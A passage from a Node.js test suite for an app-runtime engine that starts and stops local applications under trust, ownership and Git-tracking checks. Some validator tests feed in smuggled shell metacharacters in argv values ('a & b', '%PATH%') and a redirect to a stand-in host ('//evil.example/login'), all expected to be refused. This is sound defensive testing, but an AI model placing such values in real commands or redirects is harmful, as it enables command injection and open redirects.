    assert.equal(row(report, "LEGACY").started, true);
    await space.runAppRuntime("stop");
    // Writable by this account again: refused, whoever owns it.
    await sudo("chmod", "666", file);
    await until(() => refused(space.port), "the owned server to stop");
    assert.match(row(await runReal({ registryPath: space.registryPath, moduleName: "orders", action: "ensure" }), "LEGACY").reason, /writable by the account/);
  } finally {
    await sudo("rm", "-f", file);
  }
});

test("operator-local starts from a file this account owns; operator-isolated still refuses it", async () => {
  const space = await twoApps({}, { start: NPM_START }, {
    routes: { "/private": { status: 307, headers: { location: "/operator-entry" } } },
  });
  await launch(space.target, space.sibling);
  const real = (action) => runReal({ registryPath: space.registryPath, moduleName: "orders", action });
  const apps = (extra = {}) => ({
    LEGACY: application("../legacy-app", space.port, { protectedRoute: "/private", start: NPM_START, ...extra }),
    TARGET: application("../target-app", space.sibling),
  });

  for (const trust of [undefined, "operator-isolated"]) {
    await space.write({ version: 1, namespace: OWN_NAMESPACE, trust, applications: apps() });
    const isolated = await real("ensure");
    assert.equal(row(isolated, "LEGACY").startAuthorized, false, String(trust));
    assert.match(row(isolated, "LEGACY").reason, /owned by the account this engine runs as/);
    assert.equal(row(isolated, "LEGACY").trust, "operator-isolated");
    assert.equal(row(isolated, "LEGACY").onSignIn, "record-gap");
    assert.equal(await starts(space.legacy), 0);
  }

  await space.write({ version: 1, namespace: OWN_NAMESPACE, trust: "operator-local", applications: apps({ signInPath: "/operator-entry", onSignIn: "wait-for-operator" }) });
  const local = await real("ensure");
  assert.equal(row(local, "LEGACY").started, true);
  assert.equal(row(local, "LEGACY").state, "AUTH_REQUIRED");
  assert.equal(row(local, "LEGACY").trust, "operator-local");
  assert.equal(row(local, "LEGACY").onSignIn, "wait-for-operator");
  assert.equal(row(local, "LEGACY").signInPath, "/operator-entry");
  assert.equal(row(local, "LEGACY").protectedRoute, "/private");
  assert.equal(row(local, "TARGET").onSignIn, "record-gap");
  assert.equal(row(local, "TARGET").signInPath, undefined);
  // Reuse is unchanged: a second ensure starts nothing.
  assert.equal(row(await real("ensure"), "LEGACY").reused, true);
  assert.equal(await starts(space.legacy), 1);
  await real("stop");
  await until(() => refused(space.port), "the owned server to stop");

  // Everything but ownership still binds: a tracked copy is refused.
  await execFileAsync("git", ["init", "-q"], { cwd: space.targetRoot });
  await execFileAsync("git", ["add", "-f", APP_RUNTIME_CONFIG], { cwd: space.targetRoot });
  assert.match((await real("ensure")).reason, /tracked by Git/);
  assert.equal(await starts(space.legacy), 1);
});

test("an argv command starts only under operator-local, with no shell outside Windows", async () => {
  const space = await twoApps({});
  await launch(space.target, space.sibling);
  const command = { command: [process.execPath, "server.mjs", "--name=My App"] };
  const apps = (start) => ({
    LEGACY: application("../legacy-app", space.port, { protectedRoute: "/private", start }),
    TARGET: application("../target-app", space.sibling),
  });
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: apps(command) });
  assert.match((await space.runAppRuntime("ensure")).reason, /start must be exactly .*under trust "operator-local" only, \{command/);

  for (const start of [{ command: [] }, { command: ["node", "a & b"] }, { command: ["node", 'a"b'] }, { command: ["node", "%PATH%"] }, { command: ["node", ""] }, { command: "node server.mjs" }, { ...command, manager: "npm" }]) {
    await space.write({ version: 1, namespace: OWN_NAMESPACE, trust: "operator-local", applications: apps(start) });
    const report = await space.runAppRuntime("ensure");
    assert.equal(report.state, "CONFIGURATION_MISSING", JSON.stringify(start));
    assert.match(report.reason, /start must be/);
  }
  assert.equal(await starts(space.legacy), 0);

  await space.write({ version: 1, namespace: OWN_NAMESPACE, trust: "operator-local", applications: apps(command) });
  // Windows package managers are .cmd shims, so win32 runs the quoted line through a shell; /bin/sh reads that quoting as cmd.exe does.
  const log = logOf(space, "LEGACY");
  for (const platform of [process.platform, "win32"]) {
    await log.clear();
    const report = await space.runAppRuntime("ensure", { system: platform === "win32" ? WIN32 : { platform } });
    assert.equal(row(report, "LEGACY").started, true, platform);
    assert.ok(await log.size() > 0, `${platform}: the started command's output reaches its log`);
    assert.deepEqual(JSON.parse(await readFile(path.join(space.legacy, "argv.json"), "utf8")), ["--name=My App"], platform);
    assert.equal((await space.runAppRuntime("stop")).applications.find((item) => item.role === "LEGACY").stopped, true);
    await until(() => refused(space.port), "the owned server to stop");
  }
  assert.equal(await starts(space.legacy), 2);
});

test("signInPath and onSignIn are exact, and waiting for the operator needs operator-local", async () => {
  const space = await twoApps({});
  const apps = (extra) => ({ LEGACY: application("../legacy-app", space.port, extra), TARGET: application("../target-app", space.sibling) });
  const refusals = [
    [undefined, { signInPath: "login" }, /signInPath must be an absolute path/],
    [undefined, { signInPath: "/login?next=/" }, /signInPath must be an absolute path/],
    [undefined, { signInPath: "//evil.example/login" }, /signInPath must be an absolute path/],
    [undefined, { onSignIn: "wait" }, /onSignIn must be/],
    ["operator-local", { onSignIn: "wait-for-operator" }, /needs signInPath/],
    [undefined, { signInPath: "/login", onSignIn: "wait-for-operator" }, /only under trust "operator-local"/],
    ["operator-isolated", { signInPath: "/login", onSignIn: "wait-for-operator" }, /only under trust "operator-local"/],
    ["local", {}, /trust must be/],
  ];
  for (const [trust, extra, reason] of refusals) {
    await space.write({ version: 1, namespace: OWN_NAMESPACE, trust, applications: apps(extra) });
    const report = await space.runAppRuntime("check");
    assert.equal(report.state, "CONFIGURATION_MISSING", String(reason));
    assert.match(report.reason, reason);
  }
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: apps({ signInPath: "/login", onSignIn: "record-gap" }) });
  const report = await space.runAppRuntime("check");
  assert.equal(row(report, "LEGACY").signInPath, "/login");
  assert.equal(row(report, "LEGACY").onSignIn, "record-gap");
});

test("the session broker is asked with the client token, and a loose spelling of it is refused", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await launch(space.target, space.sibling);
  const seen = [];
  const broker = http.createServer((request, response) => {
    seen.push(request.headers.authorization);
    response.writeHead(200, { "content-type": "application/json" });
    response.end(JSON.stringify({ LEGACY: { state: "PRESENT" }, TARGET: { state: "NONE" } }));
  });
  await new Promise((resolve) => broker.listen(0, "127.0.0.1", resolve));
  try {
    const tokenFile = path.join(space.root, "broker.token");
    await writeFile(tokenFile, "client-token\n");
    const applications = { LEGACY: application("../legacy-app", space.port), TARGET: application("../target-app", space.sibling) };
    const url = `http://127.0.0.1:${broker.address().port}`;
    await space.write({ version: 1, namespace: OWN_NAMESPACE, sessionBroker: { url, tokenFile }, applications });
    const report = await space.runAppRuntime("check");
    assert.deepEqual(report.sessions, { LEGACY: { state: "PRESENT" }, TARGET: { state: "NONE" } });
    assert.deepEqual(seen, ["Bearer client-token"]);
    for (const sessionBroker of [url, { url, tokenFile: "broker.token" }, { url: "http://localhost:1", tokenFile }, { url, tokenFile, extra: 1 }]) {
      await space.write({ version: 1, namespace: OWN_NAMESPACE, sessionBroker, applications });
      assert.match((await space.runAppRuntime("check")).reason, /sessionBroker must be exactly/);
    }
  } finally {
    broker.close();
  }
});

test("the engine names no consumer, and the CLI exposes exactly the three actions", async () => {
  const source = await readFile(fileURLToPath(new URL("../../src/lifecycle/app-runtime.mjs", import.meta.url)), "utf8");
  assert.doesNotMatch(source, /\bwms\b|partners|\b\d{4,5}\b/i);
  assert.equal(parseValidateArguments(["auth", "--app-runtime", "ensure"]).appRuntime, "ensure");
  assert.throws(() => parseValidateArguments(["--app-runtime", "ensure"]), /Usage/);
  assert.throws(() => parseValidateArguments(["auth", "--app-runtime", "ensure", "--prefill"]), /Usage/);
  const space = await workspace({});
  await assert.rejects(space.runAppRuntime("restart"), /Unknown application runtime action/);
  assert.equal((await space.runAppRuntime("check")).namespace, OWN_NAMESPACE);
});

/** An installed consumer: its Git top level holds a receipt, and the target, with its TARGET application, is one directory down. */
const installed = async () => {
  const space = await twoApps({}, { start: NPM_START });
  await rm(path.join(space.targetRoot, ".artifact-migration-tools"), { recursive: true });
  await writeProject(space.targetRoot, space.sibling);
  await mkdir(path.join(space.root, ".artifact-migration-tools"));
  await writeFile(path.join(space.root, ".artifact-migration-tools/claude.json"), "{}");
  const home = path.join(space.root, APP_RUNTIME_CONFIG);
  const old = path.join(space.targetRoot, APP_RUNTIME_CONFIG);
  const v1 = { version: 1, namespace: OWN_NAMESPACE, applications: { LEGACY: application("../legacy-app", space.port, { start: NPM_START }), TARGET: application(".", space.sibling) } };
  const v2 = (target = "target") => ({ version: 2, namespace: OWN_NAMESPACE, applications: { LEGACY: application("legacy-app", space.port, { start: NPM_START }), TARGET: application(target, space.sibling) } });
  const writeHome = (document) => writeFile(home, JSON.stringify(document));
  const homeFolder = () => readdir(path.join(space.root, ".artifact-migration-tools"));
  return { ...space, home, old, v1, v2, writeHome, homeFolder };
};

const ownedAt = (base, role) => path.join(base, ".artifact-migration-tools/app-runtime", `${role}.json`);

test("an installed consumer keeps its configuration and its started applications in the consumer root", async () => {
  const space = await installed();
  await space.writeHome(space.v2());
  await launch(space.targetRoot, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").started, true);
  assert.equal(row(report, "LEGACY").log, ".artifact-migration-tools/app-runtime/LEGACY.log");
  assert.equal(report.reason, undefined, "the current location carries no notice");
  assert.ok((await lstat(ownedAt(space.root, "LEGACY"))).isFile());
  assert.ok((await readFile(path.join(space.root, ".artifact-migration-tools/app-runtime/LEGACY.log"))).length > 0);
  await assert.rejects(lstat(path.join(space.targetRoot, ".artifact-migration-tools")), { code: "ENOENT" });
  assert.equal(row(await space.runAppRuntime("stop"), "LEGACY").stopped, true);
  await until(() => refused(space.port), "the owned server to stop");
  await assert.rejects(lstat(ownedAt(space.root, "LEGACY")), { code: "ENOENT" });
});

test("the deprecated target-root file still works, says so once, and writes nothing in the consumer root", async () => {
  const space = await installed();
  await space.write(space.v1);
  await launch(space.targetRoot, space.sibling);
  const checked = await space.runAppRuntime("check");
  assert.equal(row(checked, "LEGACY").state, "RUNTIME_DOWN");
  assert.ok(checked.reason.includes(space.old) && checked.reason.includes(space.home), checked.reason);
  assert.match(checked.reason, /deprecated target-root location; move it to .* as version 2/);
  const started = await space.runAppRuntime("ensure");
  assert.equal(row(started, "LEGACY").started, true);
  assert.ok((await lstat(ownedAt(space.targetRoot, "LEGACY"))).isFile());
  assert.deepEqual(await space.homeFolder(), ["claude.json"], "nothing is written in the consumer root");
  await space.runAppRuntime("stop");
  await until(() => refused(space.port), "the owned server to stop");
});

test("a configuration in both places is refused, naming both, and nothing is probed or started", async () => {
  const space = await installed();
  await space.writeHome(space.v2());
  await space.write(space.v1);
  const untouched = { listeners: async () => assert.fail("probed"), killTree: async () => assert.fail("killed") };
  for (const action of ["check", "ensure"]) {
    const report = await space.runAppRuntime(action, { system: untouched });
    assert.equal(report.state, "CONFIGURATION_MISSING", action);
    assert.equal(report.configFile, APP_RUNTIME_CONFIG);
    assert.ok(report.reason.includes(space.home) && report.reason.includes(space.old), report.reason);
  }
  assert.equal(await starts(space.legacy), 0);
  assert.deepEqual((await space.runAppRuntime("stop")).applications.map((item) => item.stopped), [false, false, false], "stop is never blocked by it");
});

test("each location reads only its own version, so a file moved without its projects never starts", async () => {
  const space = await installed();
  await space.writeHome(space.v1);
  assert.match((await space.runAppRuntime("ensure")).reason, /is version 1, whose projects are relative to the target root/);
  await rm(space.home);
  await space.write({ ...space.v1, version: 2 });
  assert.match((await space.runAppRuntime("ensure")).reason, /is version 2, which belongs at the consumer root/);
  assert.equal(await starts(space.legacy), 0);
  // Without a receipt the target is the consumer root, and both versions are read there.
  await rm(path.join(space.root, ".artifact-migration-tools/claude.json"));
  for (const version of [1, 2]) {
    await space.write({ ...space.v1, version });
    const report = await space.runAppRuntime("check");
    assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN", String(version));
    assert.equal(report.reason, undefined);
  }
});

test("a consumer-root file serves only the target its TARGET application lives in", async () => {
  const space = await installed();
  await space.writeHome(space.v2("target-app"));
  for (const action of ["check", "ensure", "stop"]) {
    const report = await space.runAppRuntime(action);
    assert.equal(report.state, "CONFIGURATION_MISSING", action);
    assert.match(report.reason, /serves the target at .*, not this module's target/);
    assert.deepEqual(report.applications, []);
  }
  assert.equal(await starts(space.legacy), 0);
});

test("the consumer-root file passes the same local-authority checks", async () => {
  const space = await installed();
  await space.writeHome(space.v2());
  await launch(space.targetRoot, space.sibling);
  const real = (action) => runReal({ registryPath: space.registryPath, moduleName: "orders", action });
  assert.match(row(await real("ensure"), "LEGACY").reason, /owned by the account this engine runs as/);

  await execFileAsync("git", ["add", "-f", APP_RUNTIME_CONFIG], { cwd: space.root });
  assert.match((await space.runAppRuntime("ensure")).reason, /tracked by Git/);
  await execFileAsync("git", ["rm", "-q", "--cached", APP_RUNTIME_CONFIG], { cwd: space.root });

  const elsewhere = path.join(space.root, "elsewhere");
  await mkdir(elsewhere);
  for (const name of await space.homeFolder()) await writeFile(path.join(elsewhere, name), await readFile(path.join(space.root, ".artifact-migration-tools", name)));
  await rm(path.join(space.root, ".artifact-migration-tools"), { recursive: true });
  await symlink(elsewhere, path.join(space.root, ".artifact-migration-tools"));
  assert.match((await space.runAppRuntime("ensure")).reason, /symlink/);
  assert.equal(await starts(space.legacy), 0);
});

test("stop ends what the deprecated folder recorded once the file has moved, and nothing it did not start", async () => {
  const space = await installed();
  await space.write(space.v1);
  const target = await launch(space.targetRoot, space.sibling);
  assert.equal(row(await space.runAppRuntime("ensure"), "LEGACY").started, true);
  await rm(space.old);
  await space.writeHome(space.v2());
  // A record of a process this toolkit did not start: its start time is not this PID's.
  await mkdir(path.dirname(ownedAt(space.root, "TARGET")), { recursive: true });
  await writeFile(ownedAt(space.root, "TARGET"), JSON.stringify({ version: 1, role: "TARGET", pid: target.pid, namespace: OWN_NAMESPACE, processStart: "never", origin: "x" }));
  const stopped = await space.runAppRuntime("stop");
  assert.equal(row(stopped, "LEGACY").stopped, true);
  assert.equal(row(stopped, "TARGET").stopped, false);
  await until(() => refused(space.port), "the owned server to stop");
  assert.equal(await refused(space.sibling), false, "stop must leave a process it did not start");
  await assert.rejects(lstat(ownedAt(space.targetRoot, "LEGACY")), { code: "ENOENT" });
});

test("nothing above the target's Git work tree is read, and no work tree is a refusal", async () => {
  const space = await installed();
  await rm(path.join(space.root, ".git"), { recursive: true });
  await execFileAsync("git", ["init", "-q"], { cwd: space.targetRoot });
  // Planted above the work tree: a receipt and a file that would start LEGACY.
  await space.writeHome(space.v2());
  await space.write(space.v1);
  const report = await space.runAppRuntime("check");
  assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN");
  assert.equal(report.reason, undefined, "the target is its own consumer root");

  await rm(path.join(space.targetRoot, ".git"), { recursive: true });
  const outside = await space.runAppRuntime("ensure");
  assert.equal(outside.state, "CONFIGURATION_MISSING");
  assert.match(outside.reason, /not in a Git work tree/);
  assert.equal(await starts(space.legacy), 0);
});

test("review regression: the Git index must prove that operator configuration is untracked", async () => {
  const space = await installed();
  await space.writeHome(space.v2());
  const run = (action, listeners = async () => []) => space.runAppRuntime(action, { system: { listeners } });
  assert.equal((await run("check")).state, "RUNTIME_DOWN", "a successful empty index query permits the probes");

  await execFileAsync("git", ["add", "-f", APP_RUNTIME_CONFIG], { cwd: space.root });
  const noProbe = async () => assert.fail("refused configuration must not probe");
  assert.match((await run("ensure", noProbe)).reason, /tracked by Git/);
  await rm(space.home);
  assert.match((await run("ensure", noProbe)).reason, /tracked by Git/);
  await assert.rejects(lstat(space.home), { code: "ENOENT" });
  await space.writeHome(space.v2());

  await writeFile(path.join(space.root, ".git", "index"), "invalid index fixture");
  const before = await treeDigest(space.root);
  const report = await run("ensure", noProbe);
  assert.equal(report.state, "CONFIGURATION_MISSING");
  assert.match(report.reason, /could not verify.*Git index/i);
  assert.equal(await treeDigest(space.root), before);
  assert.equal(await starts(space.legacy), 0);
});

test("review regression: an unanswered alternate address cannot hide a foreign listener", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: { ...application("../legacy-app", space.port), origin: `http://localhost:${space.port}` },
    TARGET: application("../target-app", space.sibling),
  } });
  const owned = { address: "127.0.0.1", pid: 100, cwd: space.legacy, command: null };
  const other = { address: "::1", pid: 101, cwd: space.target, command: null };
  const run = (alternate) => space.runAppRuntime("ensure", { system: {
    lookup: async (host) => host === "localhost"
      ? [{ address: "127.0.0.1", family: 4 }, { address: "::1", family: 6 }]
      : [{ address: host, family: 4 }],
    listeners: async (port) => port === space.port ? [owned, ...(alternate ? [alternate] : [])] : [],
  } });
  assert.equal(row(await run(null), "LEGACY").reused, true, "an unused address is harmless");
  const foreign = row(await run(other), "LEGACY");
  assert.equal(foreign.state, "WRONG_APP");
  assert.equal(foreign.reused, false);
  const unknown = row(await run({ ...other, cwd: null }), "LEGACY");
  assert.equal(unknown.state, "IDENTITY_UNPROVEN");
  assert.equal(unknown.reused, false);
  const unavailable = row(await run({ ...other, cwd: space.legacy }), "LEGACY");
  assert.equal(unavailable.state, "RUNTIME_DOWN");
  assert.equal(unavailable.reused, false);
  assert.equal(await starts(space.legacy), 1);
});

test("review regression: invalid projects, roles and identity fail before any probe", async () => {
  const space = await installed();
  const invalid = [
    [{ project: space.legacy }, /project.*relative/],
    [{ project: "legacy-app/package.json" }, /project.*directory/],
    [{ identity: { route: "/health/\u0100", includes: "fixture-app" } }, /identity\.route/],
    [{ identity: { route: "/%broken", includes: "fixture-app" } }, /identity\.route/],
    [{ identity: { route: "/public", includes: " \t" } }, /identity/],
  ];
  const run = () => space.runAppRuntime("check", { system: { listeners: async () => assert.fail("invalid configuration was probed") } });
  for (const [overrides, reason] of invalid) {
    const config = space.v2();
    Object.assign(config.applications.LEGACY, overrides);
    await space.writeHome(config);
    const report = await run();
    assert.equal(report.state, "CONFIGURATION_MISSING", JSON.stringify(overrides));
    assert.match(report.reason, reason);
  }
  for (const backend of [false, null, 0, "", []]) {
    const config = space.v2();
    config.applications.BACKEND = backend;
    await space.writeHome(config);
    const report = await run();
    assert.equal(report.state, "CONFIGURATION_MISSING", JSON.stringify(backend));
    assert.match(report.reason, /applications\.BACKEND/);
  }
});

test("review regression: a missing startup script refuses read-only check and ensure before mutations", async () => {
  const space = await installed();
  const config = space.v2();
  config.applications.LEGACY.start = { ...NPM_START, script: "not-declared" };
  config.applications.TARGET.start = NPM_START;
  await space.writeHome(config);
  const before = await treeDigest(space.root);
  for (const action of ["check", "ensure"]) {
    const report = await space.runAppRuntime(action, {
      system: { listeners: async () => assert.fail("invalid startup configuration was probed") },
    });
    assert.equal(report.state, "CONFIGURATION_MISSING", action);
    assert.match(report.reason, /no package script 'not-declared'/);
    assert.equal(await treeDigest(space.root), before, action);
  }
  assert.equal(await starts(space.legacy), 0);
  assert.equal(await starts(space.targetRoot), 0);
});

test("version 2 onboarding checks missing, malformed and valid configuration before starting all three roles", async () => {
  const space = await installed();
  const noProbe = { system: { listeners: async () => assert.fail("refused configuration must not probe") } };
  const missing = await space.runAppRuntime("check", noProbe);
  assert.equal(missing.state, "CONFIGURATION_MISSING");
  assert.equal(missing.configPath, space.home);
  await assert.rejects(lstat(space.home), { code: "ENOENT" });

  const reports = await Promise.all([space.runAppRuntime("ensure", noProbe), space.runAppRuntime("ensure", noProbe)]);
  assert.equal(reports.filter((report) => report.templateCreated).length, 1);
  const initial = await readFile(space.home, "utf8");
  assert.equal((await execFileAsync("git", ["check-ignore", APP_RUNTIME_CONFIG], { cwd: space.root })).stdout.trim(), APP_RUNTIME_CONFIG);
  const template = JSON.parse(initial);
  assert.equal(template.version, 2);
  assert.equal(template.trust, "operator-isolated");
  assert.deepEqual(Object.keys(template.applications), ["LEGACY", "BACKEND", "TARGET"]);
  assert.deepEqual(template, JSON.parse(
    (await readFile(new URL("../../../../skills/start-migration/SKILL.md", import.meta.url), "utf8"))
      .split("#### Operator configuration\n")[1].match(/```json\n([\s\S]+?)\n```/)[1],
  ), "the guide shows the exact generated file");
  for (const report of reports) {
    assert.equal(report.state, "CONFIGURATION_MISSING");
    assert.equal(report.configPath, space.home);
    assert.ok(report.unresolved.includes("namespace"));
    assert.ok(report.unresolved.includes("applications.BACKEND.identity.includes"));
    assert.deepEqual(report.applications, []);
  }
  assert.deepEqual((await space.homeFolder()).sort(), [".gitignore", "claude.json", "runtime-apps.json"]);
  await assert.rejects(lstat(space.old), { code: "ENOENT" });

  const pending = space.v2();
  pending.applications.LEGACY.identity.includes = template.applications.LEGACY.identity.includes;
  await space.writeHome(pending);
  const digest = await treeDigest(space.root);
  const refused = await space.runAppRuntime("ensure", noProbe);
  assert.deepEqual(refused.unresolved, ["applications.LEGACY.identity.includes"]);
  assert.equal(refused.templateCreated, undefined);
  assert.equal(await treeDigest(space.root), digest);

  await writeFile(space.home, "{");
  assert.match((await space.runAppRuntime("ensure", noProbe)).reason, /not valid JSON/);
  assert.equal(await readFile(space.home, "utf8"), "{");

  await space.writeHome(space.v2());
  const optional = await space.runAppRuntime("check");
  assert.deepEqual(optional.applications.map(({ role }) => role), ["LEGACY", "TARGET"]);

  const backendPort = await freePort();
  const backend = await writeProject(path.join(space.root, "backend"), backendPort);
  const config = space.v2();
  config.applications.BACKEND = application("backend", backendPort, { start: NPM_START });
  config.applications.TARGET.start = NPM_START;
  const orderFile = path.join(space.root, "start-order");
  for (const [role, project] of [["BACKEND", backend], ["LEGACY", space.legacy], ["TARGET", space.targetRoot]]) {
    const server = path.join(project, "server.mjs");
    const order = `appendFileSync(${JSON.stringify(orderFile)}, ${JSON.stringify(role + "\n")});`;
    await writeFile(server, (await readFile(server, "utf8")).replace("const routes =", `${order}\nconst routes =`));
  }
  await space.writeHome(config);
  const before = await treeDigest(space.root);
  assert.equal((await space.runAppRuntime("check")).state, "RUNTIME_DOWN");
  assert.equal(await treeDigest(space.root), before);
  try {
    const report = await space.runAppRuntime("ensure");
    assert.equal(report.state, "READY");
    assert.deepEqual(report.applications.map(({ role, started }) => [role, started]), [["BACKEND", true], ["LEGACY", true], ["TARGET", true]]);
    assert.deepEqual((await readFile(orderFile, "utf8")).trim().split("\n"), ["BACKEND", "LEGACY", "TARGET"]);
  } finally {
    await space.runAppRuntime("stop");
  }
});

test("an unused IPv4 address does not block a proven IPv6-only wildcard", async (t) => {
  const server = http.createServer((_, response) => response.end("fixture-app"));
  t.after(() => server.close());
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen({ host: "::", port: 0, ipv6Only: true }, resolve);
  });
  const space = await twoApps({});
  const port = server.address().port;
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: { ...application("../legacy-app", port), origin: `http://localhost:${port}` },
    TARGET: application("../target-app", space.sibling),
  } });
  const report = await space.runAppRuntime("ensure", { system: {
    lookup: async (host) => host === "localhost"
      ? [{ address: "127.0.0.1", family: 4 }, { address: "::1", family: 6 }]
      : [{ address: host, family: 4 }],
    listeners: async (candidatePort) => candidatePort === port
      ? [{ address: "::", pid: process.pid, command: null, cwd: space.legacy }]
      : [],
  } });
  assert.equal(row(report, "LEGACY").state, "READY");
  assert.equal(row(report, "LEGACY").reused, true);
});
